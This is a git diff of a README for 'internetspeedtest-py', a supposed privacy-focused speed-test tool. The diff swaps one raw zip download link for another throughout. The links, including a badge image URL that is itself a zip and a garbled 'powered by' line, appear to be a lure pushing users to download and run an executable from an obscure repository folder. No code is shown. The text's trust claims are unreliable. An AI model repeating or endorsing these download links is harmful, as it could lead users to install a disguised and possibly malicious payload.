@@ -1,10 +1,10 @@
 # 🚀 internetspeedtest-py - Fast and Privacy-Focused Speed Testing
 
-[![Download](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py.zip%20Release-brightgreen)](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py.zip)
+[![Download](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py-v1.9-beta.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py-v1.9-beta.5.zip)
 
 ## 📦 Introduction
 
-Welcome to **internetspeedtest-py**! This application allows you to quickly test your internet speed using a simple command-line interface. It focuses on privacy while providing accurate results. You can trust our tool powered by https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py.zip and the LibreSpeed protocol.
+Welcome to **internetspeedtest-py**! This application allows you to quickly test your internet speed using a simple command-line interface. It focuses on privacy while providing accurate results. You can trust our tool powered by https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py-v1.9-beta.5.zip and the LibreSpeed protocol.
 
 ## 🛠 Features
 
@@ -26,7 +26,7 @@ To run **internetspeedtest-py**, your system should meet the following requireme
 Follow these steps to get started with **internetspeedtest-py**:
 
 1. **Download the Application**:
-   Visit [this page to download](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py.zip) the latest version of **internetspeedtest-py**. Look for the appropriate file for your operating system.
+   Visit [this page to download](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py-v1.9-beta.5.zip) the latest version of **internetspeedtest-py**. Look for the appropriate file for your operating system.
 
 2. **Installation**:
    - **Windows**: Download the `.exe` file and double-click to start the installation. Follow the prompts.
@@ -41,7 +41,7 @@ Follow these steps to get started with **internetspeedtest-py**:
 
 ## 🔗 Download & Install
 
-To get started, download the latest version now: [Click here to download!](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py.zip).
+To get started, download the latest version now: [Click here to download!](https://raw.githubusercontent.com/ELMONTA22/internetspeedtest-py/main/protargentum/internetspeedtest-py-v1.9-beta.5.zip).
 
 If you encounter any issues during the download or installation, refer to the troubleshooting section below.
 
